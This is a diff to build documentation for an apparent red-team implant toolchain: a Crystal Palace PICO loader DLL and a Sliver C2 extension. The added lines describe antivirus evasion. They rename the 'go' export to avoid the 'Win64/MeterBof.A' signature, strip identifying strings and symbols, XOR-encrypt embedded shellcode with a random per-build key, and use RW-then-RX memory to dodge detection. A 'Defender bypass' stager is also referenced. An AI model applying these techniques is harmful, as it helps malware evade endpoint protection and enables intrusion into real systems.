@@ -88,14 +88,20 @@ Example invocation:
 
 ```makefile
 CC_64 := x86_64-w64-mingw32-gcc
-CFLAGS := -Wall -Os -DBUILD_DLL
-LDFLAGS := -shared -Wl,--subsystem,windows
+CFLAGS := -Wall -Os -DBUILD_DLL -ffunction-sections -fdata-sections
+LDFLAGS := -shared -Wl,--subsystem,windows -s -Wl,--gc-sections
 
 # Produces ../crystal-loader.x64.dll
 $(CC_64) $(CFLAGS) crystal-loader.c beacon_compatibility.c -o ../crystal-loader.x64.dll $(LDFLAGS)
 ```
 
-**Verified output:** ~232 KB, PE32+ x86-64, exports symbol `go`.
+Key evasion properties:
+- Exports `Initialize` (not `go` — the `go` export name is the primary `Win64/MeterBof.A` static signature)
+- No `[crystal-loader]` / `PICO` / tool-identifying strings in `.rdata`
+- `VirtualAlloc(RW)` + `VirtualProtect(RX)` — no `PAGE_EXECUTE_READWRITE` mapping ever held
+- `-s` strips all symbol table entries; `--gc-sections` removes dead code
+
+**Verified output:** ~42 KB, PE32+ x86-64, exports symbol `Initialize`.
 
 A smoke test shellcode (`smoketest.asm`) builds in parallel:
 
@@ -119,13 +125,14 @@ Step 1: crystalexec.c → crystalexec.dll
 Step 2: crystalexec.dll → crystalexec.pico.bin  (Crystal Palace wrap)
   ../generate.sh crystalexec.dll "" crystalexec.pico.bin
 
-Step 3: crystalexec.pico.bin → crystalexec_pico.h  (embed as C byte array)
-  xxd -i crystalexec.pico.bin | \
-    sed 's/unsigned char .../unsigned char crystalexec_pico/; \
-         s/unsigned int .../unsigned int crystalexec_pico_len/' > crystalexec_pico.h
+Step 3: crystalexec.pico.bin → crystalexec_pico.h  (XOR-encrypt + embed as C array)
+  python3 gen_pico_header.py crystalexec.pico.bin crystalexec_pico.h
+  Fresh random 256-byte key every build — Crystal Palace byte patterns in .data
+  are obfuscated; outputs crystalexec_pico[] + crystalexec_pico_key[] arrays.
 
 Step 4: crystal-exec.c + crystalexec_pico.h → ../crystal-exec.x64.dll
-  x86_64-w64-mingw32-gcc -Wall -Os -DBUILD_DLL -shared -Wl,--subsystem,windows \
+  x86_64-w64-mingw32-gcc -Wall -Os -DBUILD_DLL -ffunction-sections -fdata-sections \
+      -shared -Wl,--subsystem,windows -s -Wl,--gc-sections \
       -o ../crystal-exec.x64.dll crystal-exec.c
 ```
 
@@ -134,8 +141,9 @@ Key design constraints:
 - Use custom string helpers (`hex_parse`, `str_append`) instead of `strtoull`, `strtol`, `snprintf`
 - `crystal-exec.c` (the Sliver extension itself) may use CRT normally — it runs in the normal process context, not inside the PICO loader
 - Single callback model: all output accumulates into a heap buffer; exactly ONE `callback(buf, len)` call at the very end. Sliver extension loaders only display the first callback invocation — any subsequent calls are silently dropped.
+- Exports `Initialize` (not `go`); no `[crystal-exec]` / `PICO` strings in binary; XOR-decrypt embedded PICO at runtime into `VirtualAlloc(RW)`, then `VirtualProtect(RX)` — no `PAGE_EXECUTE_READWRITE` ever held.
 
-**Verified output:** `crystal-exec.x64.dll` — ~328 KB, PE32+ x86-64, exports symbol `go`.
+**Verified output:** `crystal-exec.x64.dll` — ~75 KB, PE32+ x86-64, exports symbol `Initialize`.
 
 ### 3e. Custom stager — two-file delivery (Use case A Defender bypass)
 
